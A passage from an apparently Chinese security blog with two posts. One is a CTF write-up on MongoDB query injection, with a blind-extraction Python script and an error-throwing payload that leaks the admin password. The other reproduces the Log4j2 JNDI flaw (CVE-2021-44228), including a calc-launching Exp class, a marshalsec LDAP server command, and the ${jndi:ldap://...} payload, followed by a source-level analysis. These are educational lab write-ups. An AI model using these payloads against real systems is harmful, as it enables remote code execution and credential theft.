<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821170321323.png"></p>
<p>后缀.ts是TypeScript语言</p>
<p>从init_db.ts导入mongoose模块看出是MongoDB数据库，且flag被初始化在admin用户的数据库信息里</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821173443676.png"></p>
<p>看如下路由文件<code>routes/index.ts</code>和<code>checkmd5Regex()</code>函数代码，<code>/auth</code>路由token可控，存在注入</p>
<p>原因有二：</p>
<p>1.<code>if (checkmd5Regex(token))</code>中<code>checkmd5Regex()</code>函数的正则可以轻松绕过，使得if判断恒为真；</p>
<p>2.<code>${token.toString()}</code>被直接拼接到查询语句中</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821173334344.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821173831614.png"></p>
<h2 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h2><p>构造token</p>
<pre class="line-numbers language-none"><code class="language-none">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>使得查询条件如下，此时只需<code>this.password[0]=="a"</code>为真，就为真</p>
<pre class="line-numbers language-none"><code class="language-none">this.username == "admin" &amp;&amp; hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>那么依次类推，可以判断password的每一位字符，也就是盲注思想，根据请求包写脚本</p>
<p>访问<code>/auth</code>路由页面</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821180638439.png"></p>
<p>Token文本框随便填入test提交，抓包</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821180853838.png"></p>
<p>请求包构造主要就是Cookie和POST数据</p>
<p>为了判断字符匹配正确时的响应包特征，可以先Burp爆破一位出来</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821182939243.png" style="zoom:80%;">

<p>可看到，字符正确时，响应页面有特征字符串<code>Found. Redirecting to</code></p>
<p>综上，脚本如下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url<span class="token operator">=</span><span class="token string">"http://ef3a4031-fb8f-4859-bd29-256b01ff55ce.node4.buuoj.cn:81/auth"</span>
headers<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"session=s%3AUOifhSNPicItpLjF9bQgYM9roPiXrAED.q%2Frul3zuUNV0sCp0Zu5s1UH68ubuay957RQHuEWqFlc"</span>
<span class="token punctuation">}</span>

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">"_csrf"</span><span class="token punctuation">:</span> <span class="token string">"LEuV2E4F-7JN0Tv4LSue5dLosO0Stdu-SvQA"</span><span class="token punctuation">,</span>
            <span class="token string">"token"</span><span class="token punctuation">:</span> <span class="token string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Found. Redirecting to"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">=</span> flag<span class="token operator">+</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行结果</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821192025213.png"></p>
<p>登录即可看到flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821192314501.png"></p>
<h2 id="思路二"><a href="#思路二" class="headerlink" title="思路二"></a>思路二</h2><p>利用js的抛出异常和IIFE（立即调用函数表达式）来实现</p>
<pre class="line-numbers language-none"><code class="language-none">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=&gt;{throw Error(this.password)})()=="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>拼接到查询条件如下</p>
<pre class="line-numbers language-none"><code class="language-none">this.username == "admin" &amp;&amp; hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=&gt;{throw Error(this.password)})()==""<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>解释：</p>
<p><code>(()=&gt;{...})</code> 定义了一个匿名箭头函数</p>
<p><code>{throw Error(this.password)}</code> 函数体中使用throw Error抛出错误，并将password作为错误消息</p>
<p><code>()</code> 表示立即执行这个匿名函数</p>
<p>执行结果如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821193703182.png"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/RABCDXB/article/details/124810618">https://blog.csdn.net/RABCDXB/article/details/124810618</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2070199">https://cloud.tencent.com/developer/article/2070199</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>TypeScript代码审计</tag>
        <tag>MongoDB盲注</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j2（CVE-2021-44228）漏洞复现及原理思考</title>
    <url>/posts/1e9a0fae.html</url>
    <content><![CDATA[<h1 id="Log4j2（CVE-2021-44228）漏洞复现及原理思考"><a href="#Log4j2（CVE-2021-44228）漏洞复现及原理思考" class="headerlink" title="Log4j2（CVE-2021-44228）漏洞复现及原理思考"></a>Log4j2（CVE-2021-44228）漏洞复现及原理思考</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件。本次漏洞影响范围为Log4j2最早期的版本2.0-beta9到2.15.0。</p>
<p>因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似，导致有些人分不清自己用的是Log4j还是Log4j2。这里给出几个辨别方法：</p>
<ol>
<li>Log4j2分为2个jar包，一个是接口<code>log4j-api-${版本号}.jar</code>，一个是具体实现<code>log4j-core-${版本号}.jar</code>。Log4j只有一个jar包<code>log4j-${版本号}.jar</code>。</li>
<li>Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。</li>
<li>Log4j2的package名称前缀为<code>org.apache.logging.log4j</code>。Log4j的package名称前缀为<code>org.apache.log4j</code>。</li>
</ol>
<p>Log4j2的JNDI注入漏洞（CVE-2021-44228）可以称之为“核弹”级别。Log4j2作为类似jdk级别的基础类库，几乎无人幸免。</p>
<h2 id="一、漏洞复现"><a href="#一、漏洞复现" class="headerlink" title="一、漏洞复现"></a>一、漏洞复现</h2><h3 id="（一）服务端环境搭建"><a href="#（一）服务端环境搭建" class="headerlink" title="（一）服务端环境搭建"></a>（一）服务端环境搭建</h3><p>开发环境：IDEA 2021.2、JDK 8</p>
<p>新建一个Spring项目，<code>File</code>→<code>New</code>→<code>Project</code>，配置如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908090322543.png" style="zoom: 80%;">

<p>勾选Spring Web</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908090553268.png" style="zoom:80%;">

<p>如果第一次创建，需稍等片刻下载spring-boot相关依赖，IDEA右下角可查看相关依赖下载进度。</p>
<p>修改pom.xml文件</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091549004.png" style="zoom:80%;">

<p>添加如下代码</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091247246.png" style="zoom:80%;">

<p>在<code>log4j_demo\src\main\java\com\example\log4j_demo</code>下创建<code>HelloLog4j.java</code>，内容如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>log4j_demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestBody</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span>

<span class="token annotation punctuation">@RestController</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloLog4j</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token class-name">Logger</span>  <span class="token class-name">Logger</span> <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">HelloLog4j</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"/login"</span> <span class="token punctuation">,</span> method <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token class-name">RequestMethod</span><span class="token punctuation">.</span>POST<span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestBody</span> <span class="token class-name">Map</span> body<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> user <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> password <span class="token operator">=</span> body<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Logger</span><span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">"user:{}, password:{}"</span> <span class="token punctuation">,</span> user <span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"login"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>IDEA右上角选择<code>Log4jDemoApplication</code>→<code>Edit Configurations</code>，弹窗修改<code>Environment</code>→<code>VM options</code></p>
<pre class="line-numbers language-none"><code class="language-none">-Dcom.sun.jndi.ldap.object.trustURLCodebase=true<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908092430183.png" style="zoom:80%;">

<p>然后需要检查几个地方</p>
<h4 id="1-JDK版本相关"><a href="#1-JDK版本相关" class="headerlink" title="1. JDK版本相关"></a><strong>1. JDK版本相关</strong></h4><p>可能出现的报错，参考：<a href="https://blog.csdn.net/weixin_44299027/article/details/120848738">【Java异常】IDEA 报错：无效的目标发行版：17 </a></p>
<p><code>pom.xml</code>文件中的<code>java.version</code>属性需为8</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908093501751.png" style="zoom:80%;">

<p><code>File</code>→<code>Project Structure</code>→<code>Project</code>，SDK版本如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908094641643.png" style="zoom:80%;">

<p><code>File</code>→<code>Project Structure</code>→<code>Modules</code>，Language level如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908094857411.png" style="zoom:80%;">

<p><code>Settings</code>→<code>Java Compiler</code>如下</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908100158994.png" style="zoom:80%;">

<h4 id="2-SprinBoot版本相关"><a href="#2-SprinBoot版本相关" class="headerlink" title="2. SprinBoot版本相关"></a><strong>2. SprinBoot版本相关</strong></h4><p>可能出现的报错，参考：<a href="https://zhuanlan.zhihu.com/p/615816253">类文件具有错误的版本 61.0, 应为 52.0</a></p>
<p><code>pom.xml</code>文件中spring-boot版本</p>
<p>因为Spring官方发布从Spring 6以及SprinBoot 3.0开始最低支持JDK 17，此处用的JDK 8，所以需将SpringBoot版本降低为3.0以下，笔者此处用2.7.8。</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908100822489.png" style="zoom:80%;">

<p>上面检查好后，右上角绿色小三角运行项目，控制台输出如下</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908131454392.png"></p>
<p>浏览器访问：<a href="http://127.0.0.1:8080/login%EF%BC%8C%E9%94%99%E8%AF%AF%E9%A1%B5%E9%9D%A2%E6%98%AF%E5%9B%A0%E4%B8%BA%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%8F%AA%E6%8E%A5%E6%94%B6POST%E8%AF%B7%E6%B1%82%EF%BC%8C%E4%B8%8D%E5%BD%B1%E5%93%8D">http://127.0.0.1:8080/login，错误页面是因为代码中只接收POST请求，不影响</a></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908102318581.png" style="zoom:80%;">

<h3 id="（二）编写EXP"><a href="#（二）编写EXP" class="headerlink" title="（二）编写EXP"></a>（二）编写EXP</h3><p>新建一个Java项目，<code>File</code>→<code>New</code>→<code>Project</code></p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908102734860.png" style="zoom:80%;">

<p>然后直接Next→Next→起个项目名<code>Exp</code>→Finish</p>
<p>在src目录新建一个<code>Exp.java</code>，内容如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Exp</span> exploit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>右键运行，可看到计算器被打开，且项目目录<code>Exp\out\production\Exp</code>下生成了<code>Exp.class</code></p>
<p>在此目录打开cmd，开一个http服务</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908104429604.png"></p>
<p>然后利用反序列化工具<code>marshalsec</code>，开一个LDAP服务</p>
<p>下载：<a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p>
<p>参考：<a href="https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)">https://exploit-notes.hdks.org/exploit/web/log4j-pentesting/#exploit-apache-solr-(jndi)</a></p>
<p>下载marshalsec，进到主目录，用如下命令编译</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mvn clean package -DskipTests<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>编译成功cmd窗口末尾会显示如下内容</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908111918530.png"></p>
<p>然后开启LDAP服务</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:9898/#Exp"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908112631128.png"></p>
<p>通过HackBar用POST请求发送json格式payload如下，执行后，会弹出系统计算机</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>
	<span class="token property">"user"</span><span class="token operator">:</span> <span class="token string">"wa0er"</span><span class="token punctuation">,</span>
	<span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"${jndi:ldap://127.0.0.1:1389/Exp}"</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113116419.png"></p>
<p>此时看LDAP和HTTP服务窗口如下，<code>Exp.class</code>被调用执行</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908113454423.png"></p>
<p>复现成功！</p>
<h2 id="二、原理分析"><a href="#二、原理分析" class="headerlink" title="二、原理分析"></a>二、原理分析</h2><h3 id="（一）JNDI注入"><a href="#（一）JNDI注入" class="headerlink" title="（一）JNDI注入"></a>（一）JNDI注入</h3><p>参考：<a href="https://xz.aliyun.com/t/12277#toc-2">https://xz.aliyun.com/t/12277#toc-2</a></p>
<p><a href="https://tttang.com/archive/1611/#toc_jndi">https://tttang.com/archive/1611/#toc_jndi</a></p>
<p>JNDI(Java Naming and Directory Interface)是一个应用程序设计的 API，一种标准的 Java 命名系统接口。若程序定义了 JDNI 中的接口 API ，则就可以通过该接口 API 访问系统的 <code>命令服务</code>和<code>目录服务</code>，如下图。JNDI可访问的现有的目录及服务有:<code>JDBC</code>、<code>LDAP</code>、<code>RMI</code>、<code>DNS</code>、<code>NIS</code>、<code>CORBA</code>。</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231020153635388.png" style="zoom: 67%;">

<p>JNDI 注入，即当开发者在定义 JNDI 接口初始化时，<code>lookup()</code> 方法的参数可控，攻击者就可以将恶意的 <code>url</code> 传入参数远程加载恶意payload，造成注入攻击。</p>
<h3 id="（二）调试分析"><a href="#（二）调试分析" class="headerlink" title="（二）调试分析"></a>（二）调试分析</h3><p>由于是JNDI注入，因此可以在<code>InitialContext.lookup(String name)</code>方法下断点（也可以在创建的<code>HelloLog4j.java</code>的<code>Logger.error()</code>处下断点一步一步调试过来，但初次分析依然建议在<code>InitialContext</code>下断点，因为调用链较复杂，涉及循环、分支，且中间有一部分与此漏洞的产生关系不大）</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231012174606575.png" style="zoom: 80%;">

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231012102916281.png"></p>
<p>有几个关键点</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Logger</span><span class="token punctuation">.</span>error
  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token class-name">MessagePatternConverter</span><span class="token punctuation">.</span>format
      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token class-name">StrSubstitutor</span><span class="token punctuation">.</span>resolveVariable
          <span class="token class-name">Interpolator</span><span class="token punctuation">.</span>lookup
            <span class="token class-name">JndiLookup</span><span class="token punctuation">.</span>lookup
              <span class="token class-name">JndiManager</span><span class="token punctuation">.</span>lookup
                <span class="token class-name">InitialContext</span><span class="token punctuation">.</span>lookup<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="1-Logger-error"><a href="#1-Logger-error" class="headerlink" title="1. Logger.error()"></a>1. Logger.error()</h4><p>从<code>Logger.error()</code>处进来</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019172132503.png" style="zoom: 80%;">

<p>在进行<code>Logger.error()</code>日志记录时会采用<code>logIfEnabled()</code>方法进行判断，<code>isEnabled()</code>返回为<code>true</code>才可以继续进行日志操作。这里也是漏洞能否成功触发的关键。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019172601198.png"></p>
<p>在本次漏洞分析过程中日志等级level为ERROR，它的<code>intLevel()</code>为200，而本环境中默认的日志级别<code>this.intLevel</code>为200（ERROR），正好满足<code>this.intLevel &gt;= level.intLevel()</code>。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019173139650.png"></p>
<p>此时<code>filter()</code>方法返回true，即<code>isEnabled()</code>返回为<code>true</code>，成功进入到<code>logMessage()</code>方法中。log4j默认的日志级别定义如下图，从上到下级别逐渐降低，<code>intLevel()</code>数值逐渐增大，分别是：OFF(0)、FATAL(100)、ERROR(200)、WARN(300)、INFO(400)、DEBUG(500)、TRACE(600)、ALL(2147483647)。<strong>由此可见，漏洞能否成功触发与设置的日志Level有关，需要不低于默认日志级别。</strong></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019174105468.png"></p>
<p>然后中间就是读取配置文件创建event事件等操作，一直到<code>MessagePatternConverter.format()</code>。</p>
<h4 id="2-MessagePatternConverter-format"><a href="#2-MessagePatternConverter-format" class="headerlink" title="2. MessagePatternConverter.format()"></a>2. MessagePatternConverter.format()</h4><p>该方法对日志内容进行解析和格式化，并返回最终格式化后的日志内容。当碰到日志内容中包含<code>${</code>子串时，调用StrSubstitutor进行进一步解析。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019200851377.png"></p>
<h4 id="3-StrSubstitutor-resolveVariable"><a href="#3-StrSubstitutor-resolveVariable" class="headerlink" title="3. StrSubstitutor.resolveVariable()"></a>3. StrSubstitutor.resolveVariable()</h4><p>StrSubstitutor将<code>${</code>和<code>}</code>之间的内容提取出来，调用并传递给Interpolator.lookup()方法，实现Lookup功能。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019202544583.png"></p>
<p>其中，StrSubstitutor.substitute()会经过如下for循环，匹配<code>:-</code>子串，这里就为后面的waf绕过提供了思路。</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019201754382.png"></p>
<h4 id="4-Interpolator-lookup"><a href="#4-Interpolator-lookup" class="headerlink" title="4. Interpolator.lookup()"></a>4. Interpolator.lookup()</h4><p>Interpolator实际是一个实现Lookup功能的代理类，该类在成员变量<code>strLookupMap</code>中（**本环境是<code>lookups</code>**）保存着各类Lookup功能的真正实现类。Interpolator对上一步提取出的内容解析后，从<code>strLookupMap</code>获得Lookup功能实现类，并调用实现类的<code>lookup()</code>方法。</p>
<p>例如对本例子中的<code>jndi:ldap://127.0.0.1:1389/Exp</code>解析后得到<code>jndi</code>的Lookup功能实现类为<code>JndiLookup</code>，并调用<code>JndiLookup.lookup()</code>方法。</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203156913.png" style="zoom:80%;">

<h4 id="5-JndiLookup-lookup"><a href="#5-JndiLookup-lookup" class="headerlink" title="5. JndiLookup.lookup()"></a>5. JndiLookup.lookup()</h4><p><code>JndiLookup.lookup()</code>方法调用<code>JndiManager.lookup()</code>方法处理jndi对象。</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231019203709387.png" style="zoom: 80%;">

<h4 id="6-JndiManager-lookup"><a href="#6-JndiManager-lookup" class="headerlink" title="6. JndiManager.lookup()"></a>6. JndiManager.lookup()</h4><p><code>JndiManager.lookup()</code>直接委托给<code>InitialContext.lookup()</code>方法。这里单独提到该方法，是因为后续的补丁中较为重要的变更即为该方法。</p>
